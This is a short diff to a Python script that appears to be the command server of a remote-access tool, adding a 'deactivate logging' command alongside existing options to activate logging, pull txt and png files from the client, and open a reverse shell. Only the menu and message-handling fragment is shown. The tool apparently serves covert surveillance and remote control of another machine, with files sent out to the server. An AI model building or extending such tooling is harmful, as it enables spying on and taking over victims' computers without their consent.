@@ -20,11 +20,12 @@ print('Got connection from', addr)
 
 def print_usage():
     print("Usage:")
-    print("activate:      Activate the logging")
-    print("help:          Print this usage message")
-    print("send:          Send txt and png files to the server")
-    print("shell:         Activate reverse-shell. Enter \"exit\" to deactivate")
-    print("exit:          Terminate client and server")
+    print("help:        Print this usage message")
+    print("activate:    Activate the logging")
+    print("deactivate:  Deactivate the logging")
+    print("send:        Send txt and png files to the server")
+    print("shell:       Activate reverse-shell. Enter \"exit\" to deactivate")
+    print("exit:        Terminate client and server")
     
 while True:
     if reverse_shell_active:
@@ -56,7 +57,9 @@ while True:
                     print("terminated client. Good bye!")
                     break
                 elif msg == "logging activated":
-                    print("logging active")
+                    print("logging activated")
+                elif msg == "logging deactivated":
+                    print("logging deactivated")
                 elif msg == "reverse shell activated":
                     reverse_shell_active = True
                 elif msg == "reverse shell deactivated":
